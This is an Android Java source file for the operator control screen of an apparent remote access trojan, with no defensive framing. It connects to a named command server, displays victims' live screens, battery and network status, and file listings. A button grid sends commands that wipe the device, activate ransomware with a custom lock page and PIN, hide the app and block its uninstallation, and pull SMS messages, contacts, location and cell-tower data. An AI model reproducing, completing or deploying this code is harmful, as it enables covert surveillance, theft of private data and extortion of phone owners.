package com.testapp;

import android.app.Activity;
import android.app.AlertDialog;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.os.Handler;
import android.util.Base64;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONArray;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class ControlActivity extends Activity {
    private Socket socket;
    private String deviceId;
    private LinearLayout buttonGrid;
    private ImageView liveScreenView;
    private TextView profileInfo, dataOutput;
    private Handler handler = new Handler();
    private boolean screenActive = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_control);

        deviceId = getIntent().getStringExtra("deviceId");
        TextView title = findViewById(R.id.deviceTitle);
        title.setText("🎯 " + deviceId);
        profileInfo = findViewById(R.id.profileInfo);
        buttonGrid = findViewById(R.id.buttonGrid);
        liveScreenView = findViewById(R.id.liveScreenView);
        dataOutput = findViewById(R.id.dataOutput);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {
            Toast.makeText(this, "Error socket", Toast.LENGTH_SHORT).show();
            return;
        }

        // Terima data dari RAT (status, screen, data)
        socket.on("device_status", args -> {
            try {
                JSONObject status = (JSONObject) args[0];
                String info = String.format("Model: %s | Bat: %d%% | Net: %s",
                    status.optString("model", "?"),
                    status.optInt("battery", 0),
                    status.optString("network", "?"));
                runOnUiThread(() -> profileInfo.setText(info));
            } catch (Exception e) {}
        });
        socket.on("screen_frame", args -> {
            try {
                String base64 = (String) args[0];
                byte[] imgBytes = Base64.decode(base64, Base64.DEFAULT);
                Bitmap bmp = BitmapFactory.decodeByteArray(imgBytes, 0, imgBytes.length);
                runOnUiThread(() -> liveScreenView.setImageBitmap(bmp));
            } catch (Exception e) {}
        });
        socket.on("files", args -> {
            try {
                String files = args[0].toString();
                runOnUiThread(() -> dataOutput.setText(files));
            } catch (Exception e) {}
        });

        // Bangun grid tombol 2 kolom
        buildButtonGrid();
    }

    private void buildButtonGrid() {
        String[][] buttons = {
            {"🔦 Flash", "flashlight"},
            {"🔒 Lock", "lock"},
            {"🔓 Unlock", "unlock"},
            {"🔇 Mute", "mute"},
            {"📳 Vibrate", "vibrate"},
            {"📢 Toast", "toast"},
            {"🌐 URL", "openurl"},
            {"💣 Wipe", "wipe"},
            {"🎭 Rans ON", "ransomware_activate"},
            {"🔓 Rans OFF", "ransomware_deactivate"},
            {"👻 Hide", "hide_app"},
            {"👁️ Unhide", "unhide_app"},
            {"📂 Files", "list_files"},
            {"🛡️ Anti ON", "anti_uninstall"},
            {"🔓 Anti OFF", "anti_uninstall"},
            {"📊 SMS", "get_sms"},
            {"👥 Kontak", "get_contacts"},
            {"📍 Lokasi", "get_location"},
            {"📶 Tower", "get_celltower"}
        };

        LinearLayout row = null;
        for (int i = 0; i < buttons.length; i++) {
            if (i % 2 == 0) {
                row = new LinearLayout(this);
                row.setOrientation(LinearLayout.HORIZONTAL);
                buttonGrid.addView(row);
            }
            Button btn = new Button(this);
            btn.setText(buttons[i][0]);
            btn.setTextColor(0xFFFFFFFF);
            btn.setBackgroundColor(0xFF1a1a1a);
            String cmd = buttons[i][1];
            btn.setOnClickListener(v -> handleButton(cmd));
            LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                    0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
            params.setMargins(4, 4, 4, 4);
            btn.setLayoutParams(params);
            row.addView(btn);
        }
    }

    private void handleButton(String cmd) {
        switch (cmd) {
            case "toast": case "openurl": case "list_files":
                showInputDialog("Input", val -> sendCmd(cmd, new JSONObject() {{
                    try {
                        if (cmd.equals("list_files")) put("path", val.isEmpty() ? "/sdcard" : val);
                        else if (cmd.equals("openurl")) put("url", val);
                        else put("text", val);
                    } catch (Exception e) {}
                }}));
                break;
            case "ransomware_activate":
                showTwoInputDialog("HTML", "PIN", (html, pin) -> sendCmd(cmd, new JSONObject() {{
                    try { put("html", html); put("pin", pin); } catch (Exception e) {}
                }}));
                break;
            case "start_screen":
                sendCmd("start_screen");
                screenActive = true;
                break;
            case "stop_screen":
                sendCmd("stop_screen");
                screenActive = false;
                break;
            case "anti_uninstall":
                showInputDialog("true/false", val -> sendCmd(cmd, new JSONObject() {{
                    try { put("state", Boolean.parseBoolean(val)); } catch (Exception e) {}
                }}));
                break;
            default:
                sendCmd(cmd);
        }
    }

    private void sendCmd(String cmd) {
        sendCmd(cmd, new JSONObject());
    }

    private void sendCmd(String cmd, JSONObject params) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", cmd);
                msg.put("params", params);
                socket.emit("command", msg);
                Toast.makeText(this, "✅ " + cmd, Toast.LENGTH_SHORT).show();
            } catch (Exception e) {}
        } else {
            Toast.makeText(this, "❌ Offline", Toast.LENGTH_SHORT).show();
        }
    }

    private void showInputDialog(String title, InputCallback cb) {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle(title);
        EditText e = new EditText(this);
        b.setView(e);
        b.setPositiveButton("OK", (d, w) -> cb.onInput(e.getText().toString()));
        b.setNegativeButton("Batal", null);
        b.show();
    }

    private void showTwoInputDialog(String t1, String t2, TwoInputCallback cb) {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        LinearLayout lay = new LinearLayout(this);
        lay.setOrientation(LinearLayout.VERTICAL);
        EditText e1 = new EditText(this); e1.setHint(t1);
        EditText e2 = new EditText(this); e2.setHint(t2);
        lay.addView(e1); lay.addView(e2);
        b.setView(lay);
        b.setPositiveButton("OK", (d, w) -> cb.onInput(e1.getText().toString(), e2.getText().toString()));
        b.setNegativeButton("Batal", null);
        b.show();
    }

    interface InputCallback { void onInput(String input); }
    interface TwoInputCallback { void onInput(String i1, String i2); }
}
